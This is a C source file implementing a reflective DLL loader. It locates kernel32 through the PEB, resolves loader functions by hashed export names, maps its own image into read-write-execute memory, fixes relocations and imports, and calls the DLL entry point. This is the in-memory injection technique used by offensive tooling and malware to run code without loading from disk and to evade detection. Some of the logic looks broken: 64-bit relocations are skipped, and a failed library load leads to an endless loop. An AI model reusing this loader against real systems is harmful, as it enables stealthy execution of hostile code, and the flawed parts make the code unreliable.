
#include "..\headers\RefLoader.h"


#define DEBUG 1

ULONG_PTR WINAPI ReflectiveLoader(LPVOID param) {

	
	ULONG_PTR ownimageBase = (ULONG_PTR)param;
	/* [------------------------ PART 1 ---------------------------]
	| Now i'm going to find the address of the library kerne32.dll
	| then i will parse its export table in order to find
	| the function: loadlibrary, getprocessaddress, virtualalloc
	  [------------------------------------------------------------]
	*/
#ifdef _WIN64
	ULONG_PTR pebAddress = __readgsqword(0x60);
#else
	ULONG_PTR pebAddress = __readfsdword(0x30);
#endif

	/*---------------------------------------------
	[1.1] SEARCHING FOR THE KERNELL32 ADDRESS  [1.1]
	----------------------------------------------*/
	_PPEB peb = (_PPEB)pebAddress;
	PPEB_LDR_DATA ldr = peb->pLdr;
	LIST_ENTRY *listEntry = ldr->InMemoryOrderModuleList.Flink;
	LDR_DATA_TABLE_ENTRY *ldrData;
	ULONG_PTR k32dllBase;

	do {
		ldrData = (LDR_DATA_TABLE_ENTRY*)listEntry;
		listEntry = listEntry->Flink;
	} while (KERNEL32HASH != CalcHash((BYTE*)ldrData->BaseDllName.pBuffer, ldrData->BaseDllName.Length));

	k32dllBase = (ULONG_PTR)ldrData->DllBase;


	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)k32dllBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(k32dllBase + dosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER optHeaders = ntHeaders->OptionalHeader;
	IMAGE_DATA_DIRECTORY dirEntry = optHeaders.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)(dirEntry.VirtualAddress + k32dllBase);

	ULONG_PTR addOfname = expDir->AddressOfNames + k32dllBase;
	ULONG_PTR addOfnameOrd = expDir->AddressOfNameOrdinals + k32dllBase;
	ULONG_PTR addOfFunc = expDir->AddressOfFunctions + k32dllBase;
	ULONG_PTR address = 0;
	DWORD32 hash = 0;
	LOADLIBRARYA loadLibaddr = NULL;
	GETPROCADDRESS getproaddr = NULL;
	VIRTUALALLOC virtualalloaddr = NULL;
	WINEXEC winexec = NULL;

	for (int x = 0; x < expDir->NumberOfFunctions; x++) {
		// even in 64bit dll the rva are 32bit long
		address = *(DWORD32*)(addOfname + x * (sizeof(BYTE) * 4));
		address += (ULONG_PTR)k32dllBase;
		
		int size = strLen((BYTE*)address);
		hash = CalcHash((BYTE*)address, size);
		if (hash == LOADLIBRARYAH || hash == GETPROCCADDH || hash == VIRTUALALLOH) {
			address = addOfnameOrd + (x * 2);
			USHORT ordval = *(USHORT*)address;
			address = *(DWORD32*)(addOfFunc + (ordval * 4));
			address = address + k32dllBase;
			switch (hash)
			{
			case LOADLIBRARYAH:loadLibaddr = (LOADLIBRARYA)address;
				break;
			case GETPROCCADDH: getproaddr = (GETPROCADDRESS)address;
				break;
			case VIRTUALALLOH: virtualalloaddr = (VIRTUALALLOC)address;
				break;
			default:
				break;
			}
		}
		
	}

	/* [------------------------ PART 2 ---------------------------]
	|	Now, we must copy our image into new memory location,
	|	first we are going to copy the headers and than all
	|	the sections.
	|   [----------------------------------------------------------]
	|*/
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)ownimageBase;
	PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ownimageBase + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = NtHeaders->OptionalHeader.SizeOfImage;
	DWORD size = NtHeaders->OptionalHeader.SizeOfHeaders;
	DWORD_PTR newDLLLoc = virtualalloaddr(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	DWORD_PTR seekDest = newDLLLoc;
	DWORD_PTR seekSrc = ownimageBase;

	// copy the dll headers to the new location
	while (size--)
		*(BYTE*)(seekDest++) = *(BYTE*)seekSrc++;

	// copy the dll sections to the new location
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(NtHeaders);
	int nS = NtHeaders->FileHeader.NumberOfSections;
	for (int x = 0; x < nS; x++) {
		size = section->SizeOfRawData;
		seekDest = newDLLLoc + (DWORD_PTR)section->VirtualAddress;
		seekSrc = ownimageBase + (DWORD_PTR)section->PointerToRawData;
		while (size--)
			*(BYTE*)(seekDest++) = *(BYTE*)seekSrc++;
		section++;
	}

	/* [------------------------ PART 3 --------------------------]
	|	Now, we must relocate.
	|  [----------------------------------------------------------]
	|*/
	DWORD_PTR deltaImageBase = newDLLLoc - (DWORD_PTR)NtHeaders->OptionalHeader.ImageBase;
	IMAGE_DATA_DIRECTORY relocHeader = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	size = relocHeader.Size;
	DWORD_PTR relocSection = (newDLLLoc + (DWORD_PTR)relocHeader.VirtualAddress);

	DWORD sizeProcessed = 0;
	PIMAGE_BASE_RELOCATION block = NULL;
	PRELOCATION_ENTRY entry;
	DWORD numberofENTRY = 0;

	while (sizeProcessed < size) {

		block = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocSection + sizeProcessed);
		sizeProcessed += block->SizeOfBlock;
		numberofENTRY = ((block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(RELOCATION_ENTRY));

		for (int i = 0; i < numberofENTRY; i++) {
			DWORD_PTR address = ((DWORD_PTR)block + sizeof(IMAGE_BASE_RELOCATION) + sizeof(RELOCATION_ENTRY)*i);
			entry = (PRELOCATION_ENTRY)(address);

			// get the address of data to patch
			DWORD_PTR relocAddress = newDLLLoc + (DWORD_PTR)(block->VirtualAddress + entry->Offset);
			DWORD_PTR addtp;
			addtp = *(DWORD_PTR*)relocAddress;
			addtp += deltaImageBase;
			if (entry->Type == 3) {
				*(DWORD_PTR*)relocAddress = addtp;
			}
		}
	}

	/* [------------------------ PART 4 --------------------------]
	|	Now, we must manually resolve import address table
	|  [----------------------------------------------------------]
	|*/

	IMAGE_DATA_DIRECTORY dirImport = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	PIMAGE_IMPORT_DESCRIPTOR sector = (PIMAGE_IMPORT_DESCRIPTOR)(dirImport.VirtualAddress + newDLLLoc);
	HMODULE library = NULL;
	LPCSTR libraryName = "";

	while (sector->Name != NULL)
	{
		libraryName = (LPCSTR)(sector->Name + newDLLLoc);
		library = loadLibaddr(libraryName);
		if (library == NULL) continue;

		PIMAGE_THUNK_DATA thunk = (IMAGE_THUNK_DATA*)(newDLLLoc + sector->FirstThunk);
		while (thunk->u1.AddressOfData != NULL)
		{
			if ((thunk->u1.Ordinal & 0x80000000) != 0)
			{
				LPCSTR functionOrdinal = (LPCSTR)(0xffff & thunk->u1.Ordinal);
				thunk->u1.Function = (DWORD_PTR)getproaddr(library, functionOrdinal);
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(newDLLLoc + thunk->u1.AddressOfData);
				DWORD_PTR functionAddress = (DWORD_PTR)getproaddr(library, functionName->Name);
				thunk->u1.Function = functionAddress;
			}

			thunk++;
		}
		sector++;
	}

	/* [------------------------ PART 5 --------------------------]
	|	Now, we can call the dllentry point
	|  [----------------------------------------------------------]
	|*/

	DLLEntry DllEntry = (DLLEntry)(newDLLLoc + NtHeaders->OptionalHeader.AddressOfEntryPoint);
	(*DllEntry)((HINSTANCE)newDLLLoc, DLL_PROCESS_ATTACH, 0);



	return 0;
}


DWORD32 CalcHash(BYTE *str, DWORD size)
{
	DWORD32 p = 31;
	int m = 1e9 + 9;
	DWORD32 power_of_p = 1;
	DWORD32 hash_val = 0;

	for (int i = 0; i < size; i++) {
		hash_val = (hash_val + (str[i] - 'a' + 1) * power_of_p) % m;
		power_of_p = (power_of_p * p) % m;
	}
	return hash_val;
}

DWORD32 strLen(BYTE *str)
{
	DWORD32 i = 0;
	while (str[i] != 0) {
		i++;
	}
	return i;
}